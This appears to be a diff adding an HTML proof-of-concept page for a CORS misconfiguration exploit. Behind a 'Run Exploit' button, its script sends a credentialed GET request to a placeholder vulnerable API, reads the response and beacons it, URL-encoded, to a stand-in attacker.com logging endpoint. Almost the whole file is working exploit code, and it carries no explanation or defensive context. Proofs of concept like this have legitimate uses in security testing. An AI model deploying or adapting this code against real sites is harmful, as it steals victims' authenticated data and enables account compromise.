@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>CORS Exploit PoC - GET Request</h1>
+    <button id="exploit">Run Exploit</button>
+    <script>
+      // Target vulnerable endpoint
+      var vulnPage = "https://vulnerable-site.com/api/endpoint"; 
+
+      // Attacker's beacon URL to exfiltrate data
+      var beaconUrl = "http://attacker.com/log?data=";
+
+      document.getElementById('exploit').addEventListener('click', () => {
+        // Send a "simple" GET request
+        fetch(vulnPage, {
+          method: 'GET',
+          credentials: 'include' // Include cookies for CORS requests
+        })
+        .then(response => response.text()) // Read the response as text
+        .then(data => {
+          console.log('Response:', data);
+          alert('Exploit successful! Check console logs');
+
+          // Send the response to the attacker's server
+          const encodedData = encodeURIComponent(data);
+          new Image().src = `${beaconUrl}${encodedData}`;
+        })
+        .catch(error => {
+          console.error('Error:', error);
+          alert('Exploit failed');
+        });
+      });
+    </script>
+  </body>
+</html>
+
